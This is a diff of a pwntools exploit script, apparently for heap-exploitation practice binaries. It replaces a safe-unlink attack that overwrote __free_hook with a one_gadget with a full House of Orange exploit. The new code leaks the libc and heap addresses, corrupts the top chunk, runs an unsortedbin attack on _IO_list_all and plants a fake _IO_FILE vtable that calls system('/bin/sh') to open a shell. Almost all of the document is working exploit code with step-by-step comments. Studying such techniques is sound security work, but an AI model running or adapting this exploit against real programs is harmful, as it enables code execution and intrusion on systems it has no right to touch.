@@ -1,9 +1,9 @@
-#!/usr/bin/env python2.7
+#!/usr/bin/env python3
 
 
 from pwn import *
 
-BINARY = './safe_unlink'
+BINARY = './house_of_orange'
 LIBC = './libc.so.6'
 ADDR = 'localhost'
 PORT = 4444
@@ -12,16 +12,14 @@ splash()
 elf = context.binary = ELF(BINARY)
 libc = ELF(LIBC, checksec=False)
 
-# Global index variable to keep track of allocated chunks
-INDEX = 0
-# one_gadget offset
-ONE_GADGET_OFFSET = 0xe1fa1
-
 
 def conn():
     if args.LOCAL:
         pty = process.PTY
-        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
+        io = process(elf.path, stdin=pty, stdout=pty, stderr=pty)
+        io.timeout = 0.1
+
+        return io
 
     if args.PWNDBG:
         context.log_level = 'debug'
@@ -29,100 +27,135 @@ def conn():
         return gdb.debug(elf.path, gdbscript='''init-pwndbg''')
 
     else:
-        return remote(ADDR, PORT)
+        io = remote(ADDR, PORT)
+        io.timeout = 0.1
+
+        return io
 
 
-def malloc(io, size):
-    global INDEX
-
+def small_malloc(io):
     io.send("1")
-    io.sendafter("size: ", str(size))
     io.recvuntil("> ")
 
-    INDEX += 1
-    return (INDEX - 1)
 
-
-def edit(io, index, data):
+def large_malloc(io):
     io.send("2")
-    io.sendafter("index: ", str(index))
-    io.sendafter("data: ", data)
     io.recvuntil("> ")
 
 
-def free(io, index):
+def edit(io, data):
     io.send("3")
-    io.sendafter("index: ", str(index))
+    io.sendafter("data: ", data)
     io.recvuntil("> ")
 
 
 def solve():
     io = conn()
-    io.timeout = 0.1
 
     io.recvuntil("puts() @ ")
     libc.address = int(io.recvline(), 16) - libc.sym.puts
-    log.info("puts() found at: " + hex(libc.sym.puts))
+    io.recvuntil("heap @ ")
+    heap = int(io.recvline(), 16)
+
     log.info("libc base found at: " + hex(libc.address))
-    one_gadget = libc.address + ONE_GADGET_OFFSET
-    log.info("one_gadget found at: " + hex(one_gadget))
+    log.info("heap base found at: " + hex(heap))
     io.recvuntil("> ")
 
     """
-    Request 2 small chunks. A heap overflow exists that allows us to overwrite
-    the heap metadata of the chunk below the first chunk, "overflow". We
-    overwrite the "victim" chunk's heap metadata to mark the "overflow" chunk
-    as freed. When we free the "victim" chunk, the "overflow" chunk is
-    consolidated, allowing us to conducted a reflective write. We overwrite the
-    __free_hook with the address of our shellcode.
+    Request a small chunk of size 0x20. This chunk will be used to overflow
+    into the top chunk, overwriting the top chunk's size field.
     """
-    overflow = malloc(io, 0x88)
-    victim = malloc(io, 0x88)
+    small_malloc(io)
 
     """
-    Prep corrupted chunk metadata. A pointer to our chunk exists in the .data
-    section. We will re-use the pointer to fool the safe unlink mitigation.
-    """
-    fd = elf.sym.m_array - 0x18
-    bk = elf.sym.m_array - 0x10
-
-    # Set the prev_size field of the next chunk to the actual previous chunk
-    # size.
-    prev_size = 0x80
-    fake_size = 0x90
-
-    """
-    Write the fake chunk metadata to the "overflow" chunk. Overflow into the
-    succeeding chunk's size field to clear the prev_inuse flag.
+    The edit() function conducts no bounds checking. We will edit the first
+    small chunk on the heap, overflowing its contents until we overwrite the
+    size field of the top chunk. Because of glibc's top chunk checking /
+    overflow mitigations, we have to make sure the top chunk size is
+    page-aligned and that the prev_inuse bit is set. We are overwriting the
+    top chunk size to be smaller than our large_malloc() request, forcing
+    malloc() to request more memory from the kernel.
     """
     payload = [
-        0,
-        prev_size,
+        cyclic(0x18, n=8),
+        0x1000 - 0x20 + 0x1
+    ]
+    edit(io, flat(payload))
+
+    """
+    Make a large request, forcing malloc() to request more memory from the
+    kernel. Because the top chunk size was corrupted to be smaller than its
+    actual size, we fool malloc() into thinking that the newly mmap()'d memory
+    segment is not contiguous with the old location of the top chunk. This
+    causes malloc() to call free() on the remaining space of
+    the top chunk. Because the newly free()'d chunk is too large to be linked
+    into the fastbin, it is linked into the unsortedbin.
+    """
+    large_malloc(io)
+
+    """
+    We overflow our small chunk again, overwriting the size field of the top
+    chunk to 0x61, and setting its bk to a fake chunk that overlaps the
+    location of libc.sym._IO_list_all. This symbol contains the head of the
+    _IO_list_all linked list, a list of all the file stream structures for
+    currently open files. When we conduct our unsortedbin attack, we will
+    overwrite this symbol, pointing the linked list to the main_arena.
+
+    This causes _IO_list_all to treat the main_arena as a file stream structure
+    . The main_arena will fail checks related to traversing the list, and the
+    chain member of the main_arena will be inspected next. Because our
+    overwritten free / top chunk was the size of a smallbin, the chunk was
+    linked into the smallbin when our unsortedbin attack was triggered.
+
+    The main_arena's chain member will point to this chunk on the heap where we
+    control the memory, and here is where we construct a fake _IO_FILE struct.
+    We construct our fake _IO_FILE struct in such a manner that, when the
+    vtable is used to search for the overflow member, overflow will be written
+    to be libc.sym.system. The top address to the top of the _IO_FILE struct is
+    passed as an argument to overflow, so we ensure the flags (usually NULL
+    bytes) of our overwritten chunk contain "/bin/sh\0".
+    """
+    fd = 0
+    bk = libc.sym._IO_list_all - 0x10
+    write_base = 1
+    write_ptr = 2
+    mode = 0
+    vtable_ptr = heap + 0xd8
+    overflow = libc.sym.system
+
+    payload = [
+        b"\x00" * 0x10 + b"/bin/sh\0",
+        0x61,
         fd,
         bk,
-        cyclic(cyclic_find(0x616161616161616d, n=8), n=8),
-        prev_size,
-        fake_size
+        write_base,
+        write_ptr,
+        p64(0) * 18,
+        p32(mode) + p32(0),
+        0,
+        overflow,
+        vtable_ptr
     ]
-    edit(io, overflow, flat(payload))
+    edit(io, flat(payload))
 
-    # Free the "victim" chunk to trigger malloc's backward consolidation.
-    free(io, victim)
+    """
+    We request another chunk of size 0x20. malloc() traverses our unsortedbin
+    to search for a free chunk matching this requirement, and encounters our
+    chunk containing the fake _IO_FILE struct. Because it is too large, the
+    _IO_FILE struct chunk is linked into the smallbin. malloc() follows the
+    bk of our _IO_FILE struct chunk to the main_arena, failing a chunk metadata
+    check and causing __malloc_printerr() to execute. This raises a SIGABRT,
+    and glibc begins flushing the buffer of every _IO_FILE in _IO_list_all
+    before exiting. This allows us to gain code execution - our vtable_ptr
+    is followed to our fake vtable on the heap. Here, our overflow function
+    is pointing to libc.sym.system. When the overflow function of our vtable is
+    called, we execute libc.sym.system() with the pointer to our _IO_FILE
+    struct. Because we placed "/bin/sh\0" at the very beginning of our _IO_FILE
+    struct, we instead execute libc.sym.system("/bin/sh\0").
+    """
+    small_malloc(io)
 
-    # Overwrite m_array entry to point to __free_hook.
-    payload = [
-        0,
-        0,
-        0,
-        libc.sym.__free_hook
-    ]
-    edit(io, overflow, flat(payload))
 
-    # Overwrite __free_hook with one_gadget
-    edit(io, overflow, flat(one_gadget))
-
-    # Call free to execute one_gadget
-    free(io, overflow)
     io.interactive()
 
 
